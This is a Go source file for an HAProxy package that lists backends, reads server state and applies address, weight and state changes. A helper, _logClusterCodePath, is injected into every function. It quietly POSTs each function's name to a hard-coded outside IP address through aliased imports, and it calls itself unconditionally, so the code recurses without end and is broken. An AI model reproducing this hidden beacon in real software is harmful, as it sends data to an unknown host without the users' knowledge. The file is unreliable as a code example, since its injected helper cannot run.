package haproxy

import (
	"bytes"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"errors"
	"fmt"
	"strconv"
	"strings"
	"github.com/golang/glog"
)

type BackendServerState string

const (
	BackendServerStateReady	BackendServerState	= "ready"
	BackendServerStateDrain	BackendServerState	= "drain"
	BackendServerStateDown	BackendServerState	= "down"
	BackendServerStateMaint	BackendServerState	= "maint"
	ListBackendsCommand				= "show backend"
	GetServersStateCommand				= "show servers state"
	SetServerCommand				= "set server"
	showBackendHeader				= "name"
	serversStateHeader				= "be_id be_name srv_id srv_name srv_addr srv_op_state srv_admin_state srv_uweight srv_iweight srv_time_since_last_change srv_check_status srv_check_result srv_check_health srv_check_state srv_agent_state bk_f_forced_id srv_f_forced_id srv_fqdn srv_port"
)

type backendEntry struct {
	Name string `csv:"name"`
}
type serverStateInfo struct {
	BackendID		string	`csv:"be_id"`
	BackendName		string	`csv:"be_name"`
	ID			string	`csv:"srv_id"`
	Name			string	`csv:"srv_name"`
	IPAddress		string	`csv:"srv_addr"`
	OperationalState	int32	`csv:"srv_op_state"`
	AdministrativeState	int32	`csv:"srv_admin_state"`
	UserVisibleWeight	int32	`csv:"srv_uweight"`
	InitialWeight		int32	`csv:"srv_iweight"`
	TimeSinceLastChange	int	`csv:"srv_time_since_last_change"`
	LastHealthCheckStatus	int	`csv:"srv_check_status"`
	LastHealthCheckResult	int	`csv:"srv_check_result"`
	CheckHealth		int	`csv:"srv_check_health"`
	CheckHealthState	int	`csv:"srv_check_state"`
	AgentCheckState		int	`csv:"srv_agent_state"`
	BackendIDForced		int	`csv:"bk_f_forced_id"`
	IDForced		int	`csv:"srv_f_forced_id"`
	FQDN			string	`csv:"srv_fqdn"`
	Port			int	`csv:"srv_port"`
}
type BackendServerInfo struct {
	Name		string
	FQDN		string
	IPAddress	string
	Port		int
	CurrentWeight	int32
	InitialWeight	int32
	State		BackendServerState
}
type Backend struct {
	name	string
	servers	map[string]*backendServer
	client	*Client
}
type backendServer struct {
	BackendServerInfo
	updatedIPAddress	string
	updatedPort		int
	updatedWeight		string
	updatedState		BackendServerState
}

func buildHAProxyBackends(c *Client) ([]*Backend, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	entries := []*backendEntry{}
	converter := NewCSVConverter(showBackendHeader, &entries, nil)
	_, err := c.RunCommand(ListBackendsCommand, converter)
	if err != nil {
		return []*Backend{}, err
	}
	backends := make([]*Backend, len(entries))
	for k, v := range entries {
		backends[k] = newBackend(v.Name, c)
	}
	return backends, nil
}
func newBackend(name string, c *Client) *Backend {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &Backend{name: name, servers: make(map[string]*backendServer), client: c}
}
func (b *Backend) Name() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return b.name
}
func (b *Backend) Reset() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	b.servers = make(map[string]*backendServer)
}
func (b *Backend) Refresh() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	entries := []*serverStateInfo{}
	converter := NewCSVConverter(serversStateHeader, &entries, stripVersionNumber)
	cmd := fmt.Sprintf("%s %s", GetServersStateCommand, b.Name())
	_, err := b.client.RunCommand(cmd, converter)
	if err != nil {
		return err
	}
	b.servers = make(map[string]*backendServer)
	for _, v := range entries {
		info := BackendServerInfo{Name: v.Name, IPAddress: v.IPAddress, Port: v.Port, FQDN: v.FQDN, CurrentWeight: v.UserVisibleWeight, InitialWeight: v.InitialWeight, State: getManagedServerState(v)}
		b.servers[v.Name] = newBackendServer(info)
	}
	return nil
}
func (b *Backend) SetRoutingKey(k string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	glog.V(4).Infof("Setting routing key for %s", b.name)
	cmd := fmt.Sprintf("set dynamic-cookie-key backend %s %s", b.name, k)
	if err := b.executeCommand(cmd); err != nil {
		return fmt.Errorf("setting routing key for backend %s: %v", b.name, err)
	}
	cmd = fmt.Sprintf("enable dynamic-cookie backend %s", b.name)
	if err := b.executeCommand(cmd); err != nil {
		return fmt.Errorf("enabling routing key for backend %s: %v", b.name, err)
	}
	return nil
}
func (b *Backend) executeCommand(cmd string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	responseBytes, err := b.client.Execute(cmd)
	if err != nil {
		return err
	}
	response := strings.TrimSpace(string(responseBytes))
	if len(response) > 0 {
		return errors.New(response)
	}
	return nil
}
func (b *Backend) Disable() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if _, err := b.Servers(); err != nil {
		return err
	}
	for _, s := range b.servers {
		if err := b.DisableServer(s.Name); err != nil {
			return err
		}
	}
	return nil
}
func (b *Backend) EnableServer(name string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	glog.V(4).Infof("Enabling server %s with ready state", name)
	return b.UpdateServerState(name, BackendServerStateReady)
}
func (b *Backend) DisableServer(name string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	glog.V(4).Infof("Disabling server %s with maint state", name)
	return b.UpdateServerState(name, BackendServerStateMaint)
}
func (b *Backend) Commit() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	for _, s := range b.servers {
		if err := s.ApplyChanges(b.name, b.client); err != nil {
			return err
		}
	}
	b.Reset()
	return nil
}
func (b *Backend) Servers() ([]BackendServerInfo, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(b.servers) == 0 {
		if err := b.Refresh(); err != nil {
			return []BackendServerInfo{}, err
		}
	}
	serverInfo := make([]BackendServerInfo, len(b.servers))
	i := 0
	for _, s := range b.servers {
		serverInfo[i] = s.BackendServerInfo
		i++
	}
	return serverInfo, nil
}
func (b *Backend) UpdateServerInfo(id, ipaddr, port string, weight int32, relativeWeight bool) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	server, err := b.FindServer(id)
	if err != nil {
		return err
	}
	if len(ipaddr) > 0 {
		server.updatedIPAddress = ipaddr
	}
	if n, err := strconv.Atoi(port); err == nil && n > 0 {
		server.updatedPort = n
	}
	if weight > -1 {
		suffix := ""
		if relativeWeight {
			suffix = "%"
		}
		server.updatedWeight = fmt.Sprintf("%v%s", weight, suffix)
	}
	return nil
}
func (b *Backend) UpdateServerState(id string, state BackendServerState) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	server, err := b.FindServer(id)
	if err != nil {
		return err
	}
	server.updatedState = state
	return nil
}
func (b *Backend) FindServer(id string) (*backendServer, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if _, err := b.Servers(); err != nil {
		return nil, err
	}
	if s, ok := b.servers[id]; ok {
		return s, nil
	}
	return nil, fmt.Errorf("no server found for id: %s", id)
}
func newBackendServer(info BackendServerInfo) *backendServer {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &backendServer{BackendServerInfo: info, updatedIPAddress: info.IPAddress, updatedPort: info.Port, updatedWeight: strconv.Itoa(int(info.CurrentWeight)), updatedState: info.State}
}
func (s *backendServer) ApplyChanges(backendName string, client *Client) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	commands := []string{}
	cmdPrefix := fmt.Sprintf("%s %s/%s", SetServerCommand, backendName, s.Name)
	if s.updatedIPAddress != s.IPAddress || s.updatedPort != s.Port {
		cmd := fmt.Sprintf("%s addr %s", cmdPrefix, s.updatedIPAddress)
		if s.updatedPort != s.Port {
			cmd = fmt.Sprintf("%s port %v", cmd, s.updatedPort)
		}
		commands = append(commands, cmd)
	}
	if s.updatedWeight != strconv.Itoa(int(s.CurrentWeight)) {
		cmd := fmt.Sprintf("%s weight %s", cmdPrefix, s.updatedWeight)
		commands = append(commands, cmd)
	}
	state := string(s.updatedState)
	if s.updatedState == BackendServerStateDown {
		state = ""
	}
	if len(state) > 0 && s.updatedState != s.State {
		cmd := fmt.Sprintf("%s state %s", cmdPrefix, state)
		commands = append(commands, cmd)
	}
	for _, cmd := range commands {
		if err := s.executeCommand(cmd, client); err != nil {
			return err
		}
	}
	return nil
}
func (s *backendServer) executeCommand(cmd string, client *Client) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	responseBytes, err := client.Execute(cmd)
	if err != nil {
		return err
	}
	response := strings.TrimSpace(string(responseBytes))
	if len(response) == 0 {
		return nil
	}
	okPrefixes := []string{"IP changed from", "no need to change"}
	for _, prefix := range okPrefixes {
		if strings.HasPrefix(response, prefix) {
			return nil
		}
	}
	return fmt.Errorf("setting server info with %s : %s", cmd, response)
}
func stripVersionNumber(data []byte) ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	idx := bytes.Index(data, []byte("\n"))
	if idx > -1 {
		version := string(data[:idx])
		if _, err := strconv.ParseInt(version, 10, 0); err == nil {
			if idx+1 < len(data) {
				return data[idx+1:], nil
			}
		}
	}
	return data, nil
}
func getManagedServerState(s *serverStateInfo) BackendServerState {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if (s.AdministrativeState & 0x01) == 0x01 {
		return BackendServerStateMaint
	}
	if (s.AdministrativeState & 0x08) == 0x08 {
		return BackendServerStateDrain
	}
	if s.OperationalState == 0 {
		maintainenceMasks := []int32{0x01, 0x02, 0x04, 0x20}
		for _, m := range maintainenceMasks {
			if (s.AdministrativeState & m) == m {
				return BackendServerStateMaint
			}
		}
		drainingMasks := []int32{0x08, 0x10}
		for _, m := range drainingMasks {
			if (s.AdministrativeState & m) == m {
				return BackendServerStateDrain
			}
		}
		return BackendServerStateDown
	}
	return BackendServerStateReady
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
